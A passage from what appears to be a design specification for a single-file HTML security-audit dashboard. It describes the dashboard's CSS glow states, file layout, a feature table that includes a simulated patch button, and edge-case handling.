- In `done-passed` or `patched` state: the emoji receives `filter: saturate(1.2) drop-shadow(0 0 10px #10b981)`.
- In `done-critical` state: the emoji receives `filter: saturate(1.2) drop-shadow(0 0 10px #ef4444)`.
- In `active` state: the emoji receives `animation: floatIcon 2.4s ease-in-out infinite` with cyan aura.
- Visual state changes are denoted by the outer perimeter ring, spinning accent, halo glow, and bottom pill indicator.

---

## 8. Single-File Self-Contained Architecture

### 8.1 File Structure Specification
The complete application resides in `c:\DevWork\Depredador\Flujoweb\sistemas\security-audit\index.html` with zero external JS/CSS dependencies (except Google Fonts `Inter`):

```
sistemas/security-audit/index.html
├── <!DOCTYPE html>
├── <head>
│   ├── <meta charset="UTF-8">, viewport, title
│   ├── Google Fonts <link> (Inter)
│   └── <style> (100% Inline CSS: Hex Grid, Stepper, Score Gauge, Matrix, Drawer, Modal, Terminal Logs)
└── <body>
    ├── .app (Max-width 1200px container)
    │   ├── Header (Title, Subtitle, Live Status Badge, Action Bar)
    │   ├── Stepper Container (7 Glowing Nodes + Connection Track)
    │   ├── Hero Score & Telemetry Dashboard (SVG Circular Gauge + 4 Quick Metric Cards)
    │   ├── Vulnerability Matrix (Search Bar, Severity Filters, Tabular Findings, Live Patch Buttons)
    │   └── Terminal Console (Streaming ANSI logs, Collapsible Accordion)
    ├── Slide-Over Technical Drawer (Deep Payload & Raw Header Inspection)
    ├── Executive Summary Modal (CISO Report View + Download / Copy)
    └── <script> (100% Vanilla ES6+ Modular Code: Data Models, Engine, UIController, GaugeRenderer, ModalManager)
```

---

## 9. Comprehensive Feature & Edge Case Discovery Tables

### 9.1 Features Discovered

| # | Category | Feature | Description | Inputs | Outputs | Error Behavior | Discovered Via |
|---|---|---|---|---|---|---|---|
| 1 | Workflow | 7-Node Audit Stepper | Sequential audit flow evaluating all 7 security layers | "Iniciar Auditoría" Click | Sequenced node transitions with visual progress track | Gracefully handles manual pause/reset | ORIGINAL_REQUEST.md § R1 |
| 2 | Telemetry | Deep Inspection Drawer | Slide-over panel revealing raw headers, CVEs, CVSS vectors, and fixes | Click on Node / Row | Drawer animation with formatted syntax tabs | Closes gracefully on backdrop click or ESC | ORIGINAL_REQUEST.md § R1 |
| 3 | Score Engine | SVG Circular Gauge | Animated 0-100 score gauge with dynamic letter grades (A+ to F) | Audit Node Outcomes / Patches | Animated SVG dashoffset + color lerping | Clamps value strictly between 0 and 100 | ORIGINAL_REQUEST.md § R1 |
| 4 | Matrix | Severity Filter Tabs | Multi-tier filtering (All, Critical, High, Medium, Passed) | Tab Click | Table rows filter instantly with count badges | Shows "No findings match filter" if empty | ORIGINAL_REQUEST.md § R1 |
| 5 | Matrix | Live Dynamic Search | Real-time text search across CVEs, titles, and endpoints | Keyboard input | Table rows update dynamically | Shows zero state with reset filter button | ORIGINAL_REQUEST.md § R1 |
| 6 | Matrix | Live Patch Simulator | Interactive button that resolves finding, updates node to green, and recalculates score | Click "Simulate Fix" | Emerald badge, node glow update, score +pts | Prevents double-clicking during animation | ORIGINAL_REQUEST.md § R1 |
| 7 | Compliance | JSON Export Generator | Generates timestamped compliance report blob | Click "Export JSON" | Triggers browser download of `.json` file | Falls back to clipboard copy if download blocked | ORIGINAL_REQUEST.md § R1 |
| 8 | Reporting | Executive Summary Modal | Backdrop modal with CISO high-level risk overview | Click "View Summary" | Formatted modal with score stamp & top actions | Handles ESC key and outside click to dismiss | ORIGINAL_REQUEST.md § R1 |
| 9 | Visuals | Persistent Glowing Emojis | Emojis permanently illuminated across all lifecycle states | State transitions | CSS drop-shadow and glow aura | Emojis never replaced by basic checkmarks | Acceptance Criteria § Functional |
| 10 | Console | Streaming Terminal Logs | Collapsible live log stream with ANSI-colored timestamped events | Audit & Patch triggers | Auto-scrolling terminal entries | Caps log history at 200 lines to prevent DOM bloat | ORIGINAL_REQUEST.md § R1 |

### 9.2 Edge Cases & Mitigation Strategies

| # | Feature | Edge Case Input / Scenario | Observed / Specified Behavior | Mitigation / Safeguard |
|---|---|---|---|---|
| 1 | Audit Stepper | User clicks "Iniciar Auditoría" multiple times rapidly | Stepper locks button during scan (`disabled` state) | Ignore clicks and show active spinner until scan completes |
| 2 | Score Gauge | Rapid consecutive patch clicks | Score updates trigger overlapping `requestAnimationFrame` | Cancel existing RAF handle before starting new score lerp |
| 3 | Vulnerability Matrix | Search query matches 0 items | Empty table state rendered | Display "No vulnerabilities match your search query" with "Clear Search" action |
| 4 | JSON Export | Running export before running initial audit | Raw audit data uninitialized | Exports initial baseline configuration with "Status: Unverified / Pending Audit" |
| 5 | Inspection Drawer | User opens drawer during active scan | Drawer displays real-time evaluating telemetry | Drawer live-updates headers and payload as node finishes |
| 6 | Responsive Layout | Mobile screen width (360px - 480px) | Horizontal stepper nodes could overflow | Stepper flex wraps cleanly or compacts node dimensions (54px circles) with scroll/wrap |
| 7 | Patch Simulator | User patches all findings then clicks "Reset Audit" | All nodes reset to initial state, score reverts to baseline | Clean state reset restoring original vulnerability scores and button states |

---

## 10. Conclusion & Implementation Readiness

This survey provides a complete, self-contained blueprint for `sistemas/security-audit/index.html`. Every data model, mathematical formula, state transition, visual styling token, and interaction mechanism has been authoritatively specified to enable rapid, flawless implementation with zero ambiguity.
